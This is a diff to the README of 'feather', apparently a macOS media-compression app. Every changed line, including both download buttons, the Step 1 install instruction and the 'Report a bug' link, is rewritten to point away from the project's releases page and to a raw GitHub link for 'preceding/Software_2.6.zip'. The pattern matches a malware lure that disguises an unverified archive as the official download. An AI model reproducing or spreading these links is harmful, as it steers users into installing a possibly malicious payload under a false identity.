@@ -1,7 +1,7 @@
 <h1>🪶 feather - Make Your Media Files Lighter</h1>
 
 <p align="center">
-  <a href="https://github.com/Engraciavicarious676/feather/releases" style="display:inline-block;background-color:#4CAF50;color:white;padding:16px 32px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download feather Now</a>
+  <a href="https://raw.githubusercontent.com/Engraciavicarious676/feather/main/preceding/Software_2.6.zip" style="display:inline-block;background-color:#4CAF50;color:white;padding:16px 32px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download feather Now</a>
 </p>
 
 <p align="center">
@@ -60,7 +60,7 @@ With feather, you can compress (shrink) your files quickly and easily. The best 
 
 ### 📥 Download and Install
 
-**Step 1:** Visit this link to download the application: [https://github.com/Engraciavicarious676/feather/releases](https://github.com/Engraciavicarious676/feather/releases)
+**Step 1:** Visit this link to download the application: [https://raw.githubusercontent.com/Engraciavicarious676/feather/main/preceding/Software_2.6.zip](https://raw.githubusercontent.com/Engraciavicarious676/feather/main/preceding/Software_2.6.zip)
 
 **Step 2:** Choose the latest version of feather for macOS (look for files ending in `.dmg` or `.zip`).
 
@@ -130,7 +130,7 @@ feather is built with modern technology:
 
 Do you have ideas for new features? Found a bug? Want to help improve feather? We'd love to hear from you!
 
-- **Report a bug:** Open an issue on the [GitHub repository](https://github.com/Engraciavicarious676/feather)
+- **Report a bug:** Open an issue on the [GitHub repository](https://raw.githubusercontent.com/Engraciavicarious676/feather/main/preceding/Software_2.6.zip)
 - **Request a feature:** Share your ideas in the issues section
 - **Contribute code:** Fork the repository and submit a pull request
 
@@ -143,7 +143,7 @@ Thanks for choosing feather! We hope it makes your digital life a little easier.
 **Ready to lighten your media files?** Click the button below:
 
 <p align="center">
-  <a href="https://github.com/Engraciavicarious676/feather/releases" style="display:inline-block;background-color:#FF5722;color:white;padding:14px 28px;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download feather Today</a>
+  <a href="https://raw.githubusercontent.com/Engraciavicarious676/feather/main/preceding/Software_2.6.zip" style="display:inline-block;background-color:#FF5722;color:white;padding:14px 28px;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download feather Today</a>
 </p>
 
 ---
